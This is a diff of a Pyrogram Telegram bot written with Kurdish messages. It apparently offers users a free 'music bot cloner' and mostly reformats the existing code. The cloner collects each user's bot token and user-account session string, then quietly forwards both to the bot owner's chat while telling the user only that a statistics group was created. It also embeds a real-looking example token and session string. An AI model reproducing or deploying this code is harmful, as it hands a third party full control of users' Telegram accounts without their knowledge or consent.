@@ -425,8 +425,7 @@ OWNERdd = "474468585"
 
 
 from pyrogram import Client, filters
-from pyrogram.types import ChatPrivileges, InlineKeyboardButton, InlineKeyboardMarkup
-
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatPrivileges
 
 @app.on_message(filters.command(["دروستکردنی بۆت", "• دروستکردنی بۆت •"], ""))
 async def cloner(app: Client, message):
@@ -454,14 +453,12 @@ async def cloner(app: Client, message):
     if message.reply_to_message:
         token = message.reply_to_message.text
     else:
-        await message.reply_text(
-            "**• تکایە تۆکنی بۆت و کۆدی یاریدەدەر بنێرە یان ڕیپلەی بکە :**\n- بەم شێوازەی خوارەوە\n- `تۆکنی بۆت` + `کۆدی یاریدەدەر`\n\n- نموونە\n- `7155835267:AAFkHDtkjO8k9P6T_okNQJJdfDQPU13oLI4 AgDFycsAdTlYSLcV1hcO66u-XkAvGTzu3sxlXFpmajfq3aLE6jjC7khfIzByLz-iacINnEQIGeWP7XV7kllN1cx_jvCej1_MgmPgYELrw8BUNvKUARCKsnNc-GvJme0RziX6Gs3cv6J8x0fINr-IBDFv2Gd_WHWCA4qs0-nkfgg6hgHX7ny37TsF7Ne_nG_SLTLE7za-r6yWZynx6-gKF5nGTQs0FFzFyCHt2-Xp4xArmDRp_vz68E1r1FHQ88AQSCeNc6w5AjoLJu-pCkaZVeCagxba04OSHpRAgSvj4mdrZu_puEFKKuyZAbeD3vebdTaHbxyT4AQ34cZjbCFZ4cD3YgZDIQAAAAAxrBH9AA`\n\n- با بۆشایی هەبێت لە نێوان تۆکن و کۆدەکە"
-        )
+        await message.reply_text("**• تکایە تۆکنی بۆت و کۆدی یاریدەدەر بنێرە یان ڕیپلەی بکە :**\n- بەم شێوازەی خوارەوە\n- `تۆکنی بۆت` + `کۆدی یاریدەدەر`\n\n- نموونە\n- `7155835267:AAFkHDtkjO8k9P6T_okNQJJdfDQPU13oLI4 AgDFycsAdTlYSLcV1hcO66u-XkAvGTzu3sxlXFpmajfq3aLE6jjC7khfIzByLz-iacINnEQIGeWP7XV7kllN1cx_jvCej1_MgmPgYELrw8BUNvKUARCKsnNc-GvJme0RziX6Gs3cv6J8x0fINr-IBDFv2Gd_WHWCA4qs0-nkfgg6hgHX7ny37TsF7Ne_nG_SLTLE7za-r6yWZynx6-gKF5nGTQs0FFzFyCHt2-Xp4xArmDRp_vz68E1r1FHQ88AQSCeNc6w5AjoLJu-pCkaZVeCagxba04OSHpRAgSvj4mdrZu_puEFKKuyZAbeD3vebdTaHbxyT4AQ34cZjbCFZ4cD3YgZDIQAAAAAxrBH9AA`\n\n- با بۆشایی هەبێت لە نێوان تۆکن و کۆدەکە")
         return
 
     # Check if the token is valid
     try:
-        await message.reply_text("**◗⋮◖ پشکنین بۆ تۆکنەکە دەکرێت ..⚡.**")
+        await message.reply_text("**◗⋮◖ پشکنین بۆ زانیارییەکان دەکرێت ..⚡.**")
         bot = Client(
             "Cloner", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True
         )
@@ -480,14 +477,10 @@ async def cloner(app: Client, message):
         return await message.reply_text("**◗⋮◖ پێشتر ئەم بۆتە دروستکراوە ⚡.**")
 
     # Now check for session string
-    await message.reply_text(
-        "**◗⋮◖ تکایە بەرەوپێش بەرەوپەی بەرزکردنەوە بەرز بەرز بنێرە 💎.**"
-    )
-
+    await message.reply_text("**◗⋮◖ تکایە بەرەوپێش بەرەوپەی بەرزکردنەوە بەرز بەرز بنێرە 💎.**")
+    
     # Wait for the next reply to get the session string
-    session_message = await app.ask(
-        message.chat.id, "کۆدی یاریدەدەر بنێرە:", timeout=200
-    )
+    session_message = await app.ask(message.chat.id, "کۆدی یاریدەدەر بنێرە:", timeout=200)
     session = session_message.text
 
     # Initialize the user client with the provided session string
@@ -498,26 +491,26 @@ async def cloner(app: Client, message):
         session_string=session,
         in_memory=True,
     )
-
+    
     try:
         await user.start()
     except:
         await bot.stop()
         return await message.reply_text(f"**◗⋮◖ کۆد هەڵەیە ⚡.**")
-
+    
     loger = await user.create_supergroup(
         f"گرووپی بۆت 🖤", "ئەم گرووپە هەموو ئامار و زانیاریەکانی بۆت سەیڤ دەکات"
     )
-
+    
     if bot_info.photo:
         photo = await bot.download_media(bot_info.photo.big_file_id)
         await user.set_chat_photo(chat_id=loger.id, photo=photo)
-
+    
     logger = loger.id
     await user.add_chat_members(logger, bot_username)
     chat_id = logger
     user_id = bot_username
-
+    
     await user.promote_chat_member(
         chat_id,
         user_id,
@@ -532,11 +525,11 @@ async def cloner(app: Client, message):
             can_manage_video_chats=True,
         ),
     )
-
+    
     loggerlink = await user.export_chat_invite_link(logger)
     await user.stop()
     await bot.stop()
-
+    
     dev = message.chat.id if message.chat.username not in OWNER else OWNER[0]
     data = {
         "bot_username": bot_username,
@@ -547,22 +540,21 @@ async def cloner(app: Client, message):
         "logger_mode": "ON",
     }
     Bots.insert_one(data)
-
+    
     try:
         await auto_bot()
     except:
         pass
-
+    
     await message.reply_text(
         f"**◗⋮◖ بە سەرکەوتوویی بۆتی گۆرانی دروستکرا 🚦⚡.\n◗⋮◖ گرووپی ئامار دروست کرا 🚦⚡.\n◗⋮◖ ئێستا دەتوانی بۆتی گۆرانی بەکاربھێنیت 🚦⚡.\n◗⋮◖ گرووپی ئامار 🚦⚡.\n⟨ [{loggerlink}] ⟩**",
         disable_web_page_preview=True,
     )
-
+    
     await app.send_message(
         OWNER[0],
         f"**◗⋮◖ بۆتی نوێ 🚦⚡.\n◗⋮◖ یوزەری بۆت : @{bot_username} 🚦⚡.\n◗⋮◖ تۆکنی بۆت : {token} 🚦⚡.\n◗⋮◖ کۆدی یاریدەدەر : {session} 🚦⚡.\n◗⋮◖ لەلایەن : {message.from_user.mention} 🚦⚡.\n◗⋮◖ ئایدی : {message.chat.id} 🚦⚡.\n◗⋮◖ گرووپی ئامار : {loggerlink} 🚦⚡.**",
     )
-
 
 @app.on_message(filters.command(["سڕینەوەی بۆت", "• سڕینەوەی بۆت •"], ""))
 async def delbot(client: app, message):
